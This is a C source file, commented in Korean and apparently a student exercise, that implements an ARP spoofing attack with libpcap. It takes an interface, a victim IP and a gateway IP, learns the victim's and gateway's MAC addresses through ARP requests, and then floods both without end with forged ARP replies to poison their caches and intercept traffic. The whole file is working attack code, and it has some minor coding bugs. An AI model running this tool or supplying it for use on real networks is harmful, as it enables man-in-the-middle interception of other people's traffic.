#include <pcap.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <sys/socket.h>
#include <sys/ioctl.h>
#include <net/if.h>
#include <netinet/in.h>
#include <unistd.h>
#include <stdbool.h>
#include <arpa/inet.h>
#include <netinet/ether.h>

// 이더넷 헤더 패킷 크기 선언
#define ETHERNET_HEADER_LEN 14

// 이더넷과 ARP 헤더가 모두 들어가 있는 구조체
struct Ether_ARP {
    uint8_t Ether_dstMACaddr[6];
    uint8_t Ether_srcMACaddr[6];
    uint16_t Ether_Type;
    uint16_t HW_Type;
    uint16_t Protocol_Type;
    uint8_t HW_len;
    uint8_t Protocol_len;
    uint16_t OPcode;
    uint8_t src_MACaddr[6];
    uint8_t src_IPaddr[4];
    uint8_t dst_MACaddr[6];
    uint32_t dst_IPaddr;
} __attribute__ ((__packed__));

typedef struct {
    char *MyInterface;
    char *vicIP;
    char *gwIP;
} Get_args;

Get_args get_args = {
    .MyInterface = NULL,
    .vicIP = NULL,
    .gwIP = NULL
};

void usage() {
    printf("syntax: Send-ARP <Network Interface> <IP> <Gateway IP>\n");
    printf("sample: Send-ARP 192.168.0.3 192.168.0.1\n");
}

// 인수의 개수가 제대로 받아지면 True를 반환하는 함수
bool parse(Get_args* get_args, int argc, char* argv[]) {
    if (argc != 4) {
        usage();
        return false;
    }
    get_args->MyInterface = argv[1];
    get_args->vicIP = argv[2]; // vicIP가 argv[2]의 위치를 가리킴
    get_args->gwIP = argv[3];
    return true;
}

// ARP Request
bool ARP_Request(pcap_t* pcap, const uint8_t srcMAC[6], const uint8_t srcIP[4], const uint32_t destIP) {
    struct Ether_ARP ARPrequest;
    
    memset(ARPrequest.Ether_dstMACaddr, 0xff, sizeof(ARPrequest.dst_MACaddr));
    memcpy(ARPrequest.Ether_srcMACaddr, srcMAC, sizeof(ARPrequest.Ether_srcMACaddr));
    ARPrequest.Ether_Type = 0x0608;
    ARPrequest.HW_Type = 0x0100;
    ARPrequest.Protocol_Type = 0x0008;
    ARPrequest.HW_len = 0x06;
    ARPrequest.Protocol_len = 0x04;
    ARPrequest.OPcode = 0x0100;
    memcpy(ARPrequest.src_MACaddr, srcMAC, sizeof(ARPrequest.src_MACaddr));
    memcpy(ARPrequest.src_IPaddr, srcIP, sizeof(ARPrequest.src_IPaddr));
    memset(ARPrequest.dst_MACaddr, 0x00, sizeof(ARPrequest.dst_MACaddr));
    memcpy(&ARPrequest.dst_IPaddr, &destIP, sizeof(destIP));
    
    if (pcap_sendpacket(pcap, (const u_char*)&ARPrequest, sizeof(struct Ether_ARP)) != 0) {
        fprintf(stderr, "Error sending the ARP packet: %s\n", pcap_geterr(pcap));
        return 1;
    }
}

// Get MAC Address
uint8_t* Get_MACaddr(pcap_t* pcap) {
    struct Ether_ARP* ARP_Reply;
    struct pcap_pkthdr* header;
    const u_char* packet;
    
    int res = pcap_next_ex(pcap, &header, &packet);
    if (res == PCAP_ERROR || res == PCAP_ERROR_BREAK) {
        printf("pcap_next_ex return %d(%s)\n", res, pcap_geterr(pcap));
    }
    
    ARP_Reply = (struct Ether_ARP *)packet;
    if (ARP_Reply->Ether_Type == 0x0608 && ARP_Reply->Protocol_Type == 0x0008) {
        return ARP_Reply->src_MACaddr;
    }
    
    return NULL;
}

// 변조된 ARP Reply 전송
bool ARP_Reply(pcap_t* pcap, const uint8_t* myMAC[6], const uint8_t vicMAC[6], const uint32_t vicIP, uint32_t gwIP) {
    struct Ether_ARP ARPreply;
    
    memcpy(ARPreply.Ether_dstMACaddr, vicMAC, sizeof(ARPreply.dst_MACaddr));
    memcpy(ARPreply.Ether_srcMACaddr, myMAC, sizeof(ARPreply.Ether_srcMACaddr));
    ARPreply.Ether_Type = 0x0608;
    ARPreply.HW_Type = 0x0100;
    ARPreply.Protocol_Type = 0x0008;
    ARPreply.HW_len = 0x06;
    ARPreply.Protocol_len = 0x04;
    ARPreply.OPcode = 0x0200;
    memcpy(ARPreply.src_MACaddr, myMAC, sizeof(ARPreply.src_MACaddr));
    memcpy(&ARPreply.src_IPaddr, &gwIP, sizeof(ARPreply.src_IPaddr));
    memcpy(ARPreply.dst_MACaddr, vicMAC, sizeof(ARPreply.dst_MACaddr));
    memcpy(&ARPreply.dst_IPaddr, &vicIP, sizeof(ARPreply.dst_IPaddr));
    
    if (pcap_sendpacket(pcap, (const u_char*)&ARPreply, sizeof(struct Ether_ARP)) != 0) {
        fprintf(stderr, "Error sending the ARP packet: %s\n", pcap_geterr(pcap));
        return 1;
    }
}


// ==========================================================================================
int main(int argc, char* argv[])
{
    if (!parse(&get_args, argc, argv)){
        return -1;
    }
    
    struct ifreq ifr;
    int fd = socket(AF_INET, SOCK_STREAM, 0); // 소켓 생성 (소켓으로 MAC과 IP를 받아올 거기 때문에 어떤 소켓을 사용해도 상관 없다.)
    char *Network_Interface = get_args.MyInterface;
    uint8_t MACaddr[6]; // 나의 맥주소를 담을 변수
    uint8_t IPaddr[4]; // 나의 IP 주소를 담을 변수
    uint8_t vicMAC[6];
    uint8_t gwMAC[6];
    
    
    // ---------- Get My IP Address & My MAC Address ----------
    // IP
    ifr.ifr_addr.sa_family = AF_INET;
    strncpy(ifr.ifr_name, Network_Interface, IFNAMSIZ - 1);
    ioctl(fd, SIOCGIFADDR, &ifr);
    memcpy(IPaddr, ifr.ifr_addr.sa_data + 2, 4); // [0], [1] : Port Number, [2]~[5] : IP address
    
    // MAC
    strncpy(ifr.ifr_name, Network_Interface, IFNAMSIZ - 1);
    ioctl(fd, SIOCGIFHWADDR, &ifr);
    close(fd);
    memcpy(MACaddr, ifr.ifr_hwaddr.sa_data, 6);
    
    
    // ---------- Change Char IP to Uint IP ----------
    char *str_vicIP = get_args.vicIP;
    char *str_gwIP = get_args.gwIP;
    uint32_t vicIP;
    uint32_t gwIP;
    
    vicIP = inet_addr(str_vicIP); // NBO 순으로 저장
    gwIP = inet_addr(str_gwIP);
    
    
    // ==================== PCAP 핸들 열기 ==========================
    char errbuf[PCAP_ERRBUF_SIZE];
    pcap_t* pcap = pcap_open_live(Network_Interface, BUFSIZ, 1, 1000, errbuf);
    
    if (pcap == NULL) {
        printf("There has not been any packet");
        return -1;
    }
    
    // ---------- Sending ARP Request ----------
    ARP_Request(pcap, MACaddr, IPaddr, vicIP); // 피해자에게 ARP Request 전송
    uint8_t* result = Get_MACaddr(pcap); // ARP Request로 받아온 맥주소를 저장
    
    while (result == NULL) { // 맥주소가 제대로 저장되지 않았으면 다시 받아오기
        result = Get_MACaddr(pcap);
    }
    memcpy(vicMAC, result, sizeof(vicMAC));
    
    ARP_Request(pcap, MACaddr, IPaddr, gwIP); // 게이트웨이로 ARP Request 전송
  
    result = Get_MACaddr(pcap);

    while (result == NULL) {
        result = Get_MACaddr(pcap);
    }
    memcpy(gwMAC, result, sizeof(gwMAC));
    
    // ---------- Start ARP Spoofing -----------
    while (true) {
        ARP_Reply(pcap, MACaddr, vicMAC, vicIP, gwIP); // 피해자에게 변조된 arp 전송
        ARP_Reply(pcap, MACaddr, gwMAC, gwIP, vicIP); // 게이트웨이로 변조된 arp 전송
    }
}